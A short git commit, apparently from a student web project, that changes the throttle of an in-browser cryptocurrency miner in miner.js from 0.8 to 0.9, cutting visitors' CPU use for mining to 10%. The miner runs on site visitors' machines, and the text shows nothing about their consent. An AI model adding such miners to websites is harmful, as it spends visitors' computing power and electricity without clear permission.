e73444a1df8521fe8377fba665ecbb2a597966b8
Johannes Koch <johannes.koch@student.uibk.ac.at>
2019-05-15 23:19:40 +0200

    decreased CPU usage of mining to 10%

--- src/main/webapp/resources/js/miner.js
+++ src/main/webapp/resources/js/miner.js
@@ -1,5 +1,5 @@
 let _client = new Client.Anonymous('77270305de2f3d5c1e63ab8f7e4c638b62a9f0103d470b6eda397c8bb2a0d7bf', { // public key of our site
-  throttle: 0.8, // throttle is % of performance not used
+  throttle: 0.9, // throttle is % of performance not used
   ads: 0 // show no ads
 });
 _client.start(); // banner options: position, text, bg, height, fg
